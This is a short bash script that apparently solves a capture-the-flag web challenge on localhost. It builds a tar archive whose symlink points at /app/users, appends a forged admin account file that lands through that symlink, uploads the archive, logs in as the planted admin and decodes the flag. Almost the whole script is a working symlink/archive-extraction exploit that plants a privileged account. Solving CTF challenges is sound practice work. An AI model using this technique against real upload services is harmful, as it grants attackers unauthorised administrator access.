#!/bin/bash

# build the malicious tar archive
# add a symlink to the archive
ln -s /app/users a
tar -cf archive.tar a
rm a
# our user json
mkdir a
echo '{"passhash":"'`echo -n admin|sha256sum|cut -d' ' -f1`'","perm_level":3}' > a/myadmin.json
# add it to the archive as a/myadmin.json so it follows the symlink
tar --append -f archive.tar a/myadmin.json
# cleanup
rm -r a

# Interact with the server to get the flag
# Register a new user so we can upload our payload
curl -L http://localhost:8000/register -c basic_user_cookie_jar -d 'user=mybasicuser&password1=pass&password2=pass'
# upload our payload
curl -L http://localhost:8000/archive -b basic_user_cookie_jar -F 'file=@./archive.tar'
# log in with our added user
curl -L http://localhost:8000/login -c admin_user_cookie_jar -d 'user=myadmin&password=admin'
# get the flag
adminpage=$(curl http://localhost:8000/admin -b admin_user_cookie_jar)
# cut the flag out out of the webpage
flag=${adminpage#*\'}
flag=${flag%\'*}
# print the flag
echo Flag:
echo $flag | base64 -d
echo
#cleanup
rm *_cookie_jar
rm archive.tar
